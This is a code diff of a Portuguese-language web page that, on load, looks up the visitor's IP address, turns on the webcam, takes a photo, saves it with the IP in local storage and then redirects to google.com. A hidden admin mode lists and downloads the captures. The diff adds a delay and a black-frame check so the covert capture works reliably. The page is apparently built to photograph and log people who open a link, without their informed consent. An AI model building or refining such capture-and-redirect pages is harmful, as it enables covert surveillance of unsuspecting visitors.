@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Captura de Foto Automática / Modo Administrador</title>
     <style>
+        /* [ ... ESTILOS CSS INALTERADOS ... ] */
         body { font-family: Arial, sans-serif; padding: 20px; background-color: #222; color: #eee; }
         h1 { color: #4CAF50; }
         #app-container { max-width: 800px; margin: 0 auto; }
@@ -16,7 +17,6 @@
         #history-table tr:hover { background-color: #555; }
         .active-row { background-color: #007bff !important; color: white; }
         #photo-display { margin-top: 40px; text-align: center; }
-        /* A imagem será removida, substituída pelo botão */
         #download-button { 
             display: none; 
             margin-top: 15px; 
@@ -74,7 +74,7 @@
 
     <script>
         // ==========================================================
-        // VARIÁVEIS E CONSTANTES
+        // VARIÁVEIS E CONSTANTES (INALTERADAS)
         // ==========================================================
         const REDIRECT_URL = 'https://www.google.com';
         const STORAGE_KEY = 'photoHistory';
@@ -91,8 +91,6 @@
         const redirectTimerSpan = document.getElementById('redirect-timer');
         const tableBody = document.querySelector('#history-table tbody');
         const selectedIpText = document.getElementById('selected-ip-text');
-        
-        // NOVO ELEMENTO
         const downloadButton = document.getElementById('download-button'); 
 
         let photoData = null;
@@ -101,51 +99,45 @@
         let redirectCountdownId = null;
         let historyData = [];
         let isInAdminMode = false;
-        let currentSelectedPhotoBase64 = null; // Armazena a foto Base64 da linha clicada
+        let currentSelectedPhotoBase64 = null;
 
         // ==========================================================
-        // FUNÇÕES DE ADMINISTRAÇÃO E DOWNLOAD
+        // FUNÇÕES DE ADMINISTRAÇÃO E DOWNLOAD (INALTERADAS)
         // ==========================================================
         
-        function loadHistory() {
+        function loadHistory() { /* ... */
             const storedData = localStorage.getItem(STORAGE_KEY);
             if (storedData) {
                 historyData = JSON.parse(storedData);
             }
         }
         
-        function saveHistory() {
+        function saveHistory() { /* ... */
             localStorage.setItem(STORAGE_KEY, JSON.stringify(historyData));
         }
 
-        // 🟢 NOVO: Função para iniciar o download da foto
-        function downloadPhoto(base64Image, ip, timestamp) {
-            // Cria o link de Data URI completo
+        function downloadPhoto(base64Image, ip, timestamp) { /* ... */
             const dataURI = DATA_PREFIX + base64Image;
 
-            // Cria um elemento <a> temporário
             const a = document.createElement('a');
             a.href = dataURI;
             
-            // Define o nome do arquivo com base no IP e na hora da captura
             const formattedTime = new Date(timestamp).toLocaleTimeString('pt-BR', {hour12: false}).replace(/:/g, '-');
             const filename = `CAPTURA_${ip.replace(/\./g, '_')}_${formattedTime}.png`;
             
             a.download = filename;
 
-            // Simula o clique
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
 
-            // Reseta o botão
             downloadButton.textContent = "Download Iniciado!";
             setTimeout(() => {
                 downloadButton.textContent = "Fazer Download da Foto";
             }, 1000);
         }
 
-        function renderTable(selectedIndex = -1) {
+        function renderTable(selectedIndex = -1) { /* ... */
             tableBody.innerHTML = ''; 
             
             historyData.slice().reverse().forEach((item, index) => {
@@ -158,20 +150,16 @@
                 row.insertCell().textContent = new Date(item.timestamp).toLocaleString();
                 
                 row.onclick = () => {
-                    // Remove destaque das outras linhas
                     document.querySelectorAll('#history-table tr').forEach(r => r.classList.remove('active-row'));
                     row.classList.add('active-row');
                     
-                    // Atualiza a informação e armazena o Base64 para download
                     selectedIpText.textContent = `Dados da Captura: ${item.ip} - ${new Date(item.timestamp).toLocaleString()}`;
                     currentSelectedPhotoBase64 = item.img;
                     
-                    // Ativa o botão de download
                     downloadButton.style.display = 'block';
                     downloadButton.disabled = false;
                     downloadButton.textContent = "Fazer Download da Foto";
 
-                    // Remove o listener anterior e adiciona o novo (para evitar downloads duplicados)
                     downloadButton.onclick = () => {
                         downloadPhoto(currentSelectedPhotoBase64, item.ip, item.timestamp);
                     };
@@ -179,7 +167,7 @@
             });
         }
         
-        function enterAdminMode() {
+        function enterAdminMode() { /* ... */
             if (isInAdminMode) return;
 
             isInAdminMode = true; 
@@ -201,33 +189,52 @@
         }
 
         // ==========================================================
-        // FLUXO DE CAPTURA (NÃO ALTERADO)
+        // FLUXO DE CAPTURA (REAJUSTADO)
         // ==========================================================
 
-        function fetchUserIP() { /* ... código ... */ 
+        function fetchUserIP() { /* ... */
             return fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => { userIP = data.ip; })
                 .catch(() => { userIP = 'IP_NAO_ENCONTRADO'; });
         }
         
-        function startWebcam() { /* ... código ... */
+        // 🛠️ REAJUSTE CRÍTICO: Adicionar um atraso após o carregamento para garantir o frame da câmera.
+        function startWebcam() {
             return navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } })
                 .then(stream => {
                     webcamStream = stream;
                     video.srcObject = stream;
-                    return new Promise(resolve => video.onloadedmetadata = resolve);
+                    
+                    return new Promise(resolve => {
+                        video.onloadedmetadata = () => {
+                            // Otimização: Espera o vídeo carregar os metadados E mais 500ms (meio segundo)
+                            // para que o primeiro frame da câmera seja renderizado
+                            setTimeout(resolve, 500); 
+                        };
+                    });
                 });
         }
         
-        function takePhoto() { /* ... código ... */
+        // 🛠️ REAJUSTE: Garantir que o drawImage use o tamanho real do vídeo
+        function takePhoto() {
+            // Usa as dimensões do vídeo ativo, não valores fixos
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
+            
+            // Desenha o frame atual do vídeo no canvas
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Verifica se o canvas está vazio (ainda está preto)
+            const imageData = context.getImageData(0, 0, 1, 1).data;
+            if (imageData[0] === 0 && imageData[1] === 0 && imageData[2] === 0) {
+                 console.warn("A imagem capturada pode estar preta. O atraso pode ter sido insuficiente.");
+            }
+            
             photoData = canvas.toDataURL('image/png').split(',')[1]; 
         }
 
-        function saveAndRedirect() { /* ... código ... */
+        function saveAndRedirect() { /* ... */
             if (photoData) {
                 const newItem = {
                     ip: userIP,
@@ -265,7 +272,7 @@
         }
 
         // ==========================================================
-        // INICIALIZAÇÃO E CONTROLE DE TECLAS (NÃO ALTERADO)
+        // INICIALIZAÇÃO E CONTROLE DE TECLAS (INALTERADO)
         // ==========================================================
         
         window.addEventListener('keydown', (e) => {
@@ -291,10 +298,15 @@
             await fetchUserIP();
             
             try {
-                await startWebcam();
+                // 1. Inicia webcam e espera 500ms (Ajuste crítico)
+                await startWebcam(); 
+                
+                // 2. Tira a foto
                 statusMessage.textContent = "Câmera ativa. Capturando foto e salvando...";
-                takePhoto();
-                saveAndRedirect();
+                takePhoto(); 
+                
+                // 3. Salva e redireciona
+                saveAndRedirect(); 
                 
             } catch (e) {
                 console.error("Erro na captura:", e);
